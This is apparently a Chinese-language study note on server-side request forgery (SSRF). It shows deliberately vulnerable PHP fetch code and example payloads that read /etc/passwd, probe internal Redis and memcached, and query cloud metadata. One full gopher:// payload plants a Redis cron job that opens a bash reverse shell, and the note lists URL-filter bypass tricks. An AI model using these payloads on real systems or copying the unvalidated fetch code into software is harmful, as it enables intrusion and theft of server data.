# SSRF 简介

SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。

漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。

攻击者可以利用 SSRF 实现的攻击主要有 5 种：

1. 可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息
2. 攻击运行在内网或本地的应用程序（比如溢出）
3. 对内网 WEB 应用进行指纹识别，通过访问默认文件实现
4. 攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击（比如 Struts2，sqli 等）
5. 利用 `file` 协议读取本地文件等

# SSRF 漏洞出现的场景

- 能够对外发起网络请求的地方，就可能存在 SSRF 漏洞
- 从远程服务器请求资源（Upload from URL，Import & Export RSS Feed）
- 数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）
- Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP）
- 文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML）

1.file_get_contents

```php
<?php
if (isset($_POST['url'])) { 
    $content = file_get_contents($_POST['url']); 
    $filename ='./images/'.rand().';img1.jpg'; 
    file_put_contents($filename, $content); 
    echo $_POST['url']; 
    $img = "<img src=\"".$filename."\"/>"; 
}
echo $img;
?>
```

2.fsockopen()

```php
<?php 
function GetFile($host,$port,$link) { 
    $fp = fsockopen($host, intval($port), $errno, $errstr, 30); 
    if (!$fp) { 
        echo "$errstr (error number $errno) \n"; 
    } else { 
        $out = "GET $link HTTP/1.1\r\n"; 
        $out .= "Host: $host\r\n"; 
        $out .= "Connection: Close\r\n\r\n"; 
        $out .= "\r\n"; 
        fwrite($fp, $out); 
        $contents=''; 
        while (!feof($fp)) { 
            $contents.= fgets($fp, 1024); 
        } 
        fclose($fp); 
        return $contents; 
    } 
}
?>
```

这段代码使用 `fsockopen` 函数实现获取用户指定 URL 的数据（文件或者 HTML）。这个函数会使用 socket 跟服务器建立 TCP 连接，传输原始数据。

3.curl_exec()

```php
<?php 
if (isset($_POST['url'])) {
    $link = $_POST['url'];
    $curlobj = curl_init();
    curl_setopt($curlobj, CURLOPT_POST, 0);
    curl_setopt($curlobj,CURLOPT_URL,$link);
    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);
    $result=curl_exec($curlobj);
    curl_close($curlobj);

    $filename = './curled/'.rand().'.txt';
    file_put_contents($filename, $result); 
    echo $result;
}
?>
```

使用 `curl` 获取数据。

4.fopen

```php
<?php

/**
* Check if the 'url' GET variable is set
* Example - http://localhost/?url=http://testphp.vulnweb.com/images/logo.gif
*/
if (isset($_GET['url'])){
$url = $_GET['url'];

/**
* Send a request vulnerable to SSRF since
* no validation is being done on $url
* before sending the request
*/
$image = fopen($url, 'rb');

/**
* Send the correct response headers
*/
header("Content-Type: image/png");

/**
* Dump the contents of the image
*/
fpassthru($image);
}
```

上面栗子中$url可控，通过fopen造成SSRF，可以向服务器/外部发送请求，比如

GET /?url =file:///etc/passwd

GET /?url=dict://localhost:11211/stat

GET /?url=http://169.254.169.254/latest/meta-data/

GET /?url=dict://localhost:11211/stat

5.curl

```php
#curl例子 漏洞代码ssrf.php (未作任何SSRF防御) 
<?php 
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, $_GET['url']); 
#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0); 
#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
curl_exec($ch); 
curl_close($ch); 
?>
```

首先curl查看版本以及支持的协议

```
curl 8.7.1 (Windows) libcurl/8.7.1 Schannel zlib/1.3 WinIDN
Release-Date: 2024-03-27
Protocols: dict file ftp ftps http https imap imaps ipfs ipns mqtt pop3 pop3s smb smbs smtp smtps telnet tftp
Features: alt-svc AsynchDNS HSTS HTTPS-proxy IDN IPv6 Kerberos Largefile libz NTLM SPNEGO SSL SSPI threadsafe Unicode UnixSockets
```

以看到该版本支持很多协议，其中dict协议、gopher协议、http/s协议以及file协议使用较为广泛。

# 本地利用

1. file协议查看文件curl -v ‘file:///etc/passwd’
2. dict协议探测端口curl -v ‘dict://127.0.0.1:22/info’(查看ssh的banner信息)curl -v ‘dict://127.0.0.1:6379/info’(查看redis相关配置)
3. gopher协议支持GET&POST请求，同时在攻击内网ftp、redis、telnet、Memcache上有极大作用利用gopher协议访问redis反弹shell

```
curl -v 'gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a'
```

# 远程利用

## gopher协议

gopher 协议是一个在 http 协议诞生前用来访问 Internet 资源的协议可以理解为http 协议的前身或简化版，虽然很古老但现在很多库还支持gopher 协议而且gopher 协议功能很强大。
它可以实现多个数据包整合发送，然后gopher 服务器将多个数据包捆绑着发送到客户端，这就是它的菜单响应。比如使用一条gopher 协议的curl 命令就能操作mysql 数据库或完成对redis 的攻击等等。
gopher 协议使用tcp 可靠连接。

**1.协议格式**

gopher url 格式为：

```
gopher://<host>:<port>/<gopher-path>
<port>默认为70。
<gopher-path>
```

其中`<gopher-path>`格式可以是如下其中的一种`</gopher-path>`

```
<gophertype><selector>
<gophertype><selector>%09<search>
<gophertype><selector>%09<search>%09<gopher+_string>
```

整个`<gopher-path>`部分可以省略，这时候`\`也可以省略`<gophertype>`为默认的1。
`<gophertype>`是一个单字符用来表示url 资源的类型，在常用的安全测试中发现不管这个字符是什么都不影响，只要有就行了。
`<selector>`个人理解这个是包的内容，为了避免一些特殊符号需要进行url 编码，但如果直接把wireshark 中ascii 编码的数据直接进行url 编码然后丢到gopher 协议里跑会出错，得在wireshark 里先换成hex 编码的原始数据后再每两个字符的加上`%`，通过对比发现直接url 编码的话会少了`%0d`回车字符。
`<search>`用于向gopher 搜索引擎提交搜索数据，和`<selector>`之间用`%09`隔开。
`<gopher+_string>`是获取gopher+ 项所需的信息，gopher+ 是gopher 协议的升级版。

**2.gopher 协议在ssrf 中的利用**

出现ssrf 的地方如果没有对协议、ip、端口等一些东西进行限制，则可以用来探测内网存活的ip 及开放的端口、读取任意文件、利用phar 协议触发反序列化、攻击内网redis/memcache/mysql 及web 应用fastcgi 或其他服务等等。
而gopher 协议在其中占了很重要的角色。

测试代码：

```
<?php
$url = $_GET['url'];
$curlobj = curl_init($url);
curl_setopt($curlobj, CURLOPT_HEADER, 0);
curl_exec($curlobj);
?>
```

**3.攻击内网web 服务**

struts 2 s2-045

**4.攻击内网redis**

**5.攻击mysql**

**6.攻击内网ftp**

**7.上传文件**

**8.攻击FastCGI**

以上场景后面再复现，最近没有时间。

https://xz.aliyun.com/t/6993

https://blog.chaitin.cn/gopher-attack-surfaces/

# Bypass

1. 在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。这时候可能会出现对URL参数解析不当，导致可以绕过过滤。如 `<a href="http://[www.baidu.com@10.10.10]">http://www.baidu.com@10.10.10.10 `相当于请求[http://10.10.10.10](http://10.10.10.10/) 访问的资源是10.10.10.10内网资源当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是[www.baidu.com](http://www.baidu.com/)，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为[www.baidu.com](http://www.baidu.com/)，而实际上这个URL所请求的内容都是192.168.0.1上的内容。
2. ip进制转换为十进制如http://baidu.com/?url=dict://192.168.100.1:6379/info >> http://baidu.com/?url=dict://3232261121:6379/info
3. xip.io & xip.name

```lua
foo.bar.10.10.0.1.xip.io > 10.10.0.1

10.0.0.1.xip.io > 10.0.0.1

www.10.10.0.1.xip.name > 10.10.0.1

…
```

302跳转 & 短域名([http://tinyurl.com](http://tinyurl.com/))

# 参考链接

https://ctf-wiki.org/web/ssrf/

https://www.anquanke.com/post/id/145519

https://xz.aliyun.com/t/6993?time__1311=n4%2BxnD0DgDuAi%3DDOQDCDlhje0%3Deav%2Bh%2BD0Kqb%3Dx

https://blog.chaitin.cn/gopher-attack-surfaces/
